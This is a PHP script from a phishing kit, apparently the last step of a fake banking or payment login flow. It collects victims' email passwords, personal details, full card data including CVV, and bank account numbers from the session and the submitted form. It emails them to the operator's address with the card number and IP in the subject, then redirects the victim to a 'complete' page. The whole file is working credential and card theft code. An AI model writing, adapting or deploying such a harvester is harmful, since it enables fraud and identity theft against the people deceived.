<?php
session_start();

$ip = getenv("REMOTE_ADDR");
$crd = $_POST['crd'];

$msg = "

Email Address : ".$_SESSION['email']."
Password : ".$_SESSION['password']."
Full Name : ".$_SESSION['name']."
Date of Birth : ".$_SESSION['day']." ".$_SESSION['month']." ".$_SESSION['year']."
Billing Address : ".$_SESSION['billing']."
City : ".$_SESSION['city']."
County : ".$_SESSION['county']."
Postcode : ".$_SESSION['postcode']."
Mobile Number : ".$_SESSION['mobile']."
---------------------------------
Name On Card : ".$_POST['nmc']."
Card Number : ".$_POST['crd']."
Expiry Date : ".$_POST['exm']." ".$_POST['exy']."
CSC/CVV : ".$_POST['csc']."
Sort Code : ".$_POST['srt']."
Bank Name : ".$_POST['nbn']."
Account Number : ".$_POST['acb']."
IP : $ip
==================================";

include 'email.php';
$subj = "$crd - $ip";
$headers .= "Content-Type: text/plain; charset=UTF-8\n";
$headers .= "Content-Transfer-Encoding: 8bit\n";
mail("$to", $subj, $msg,"$headers");
include 'hostname_check.php';
header("Location: complete.php?ip=$ip");
?>


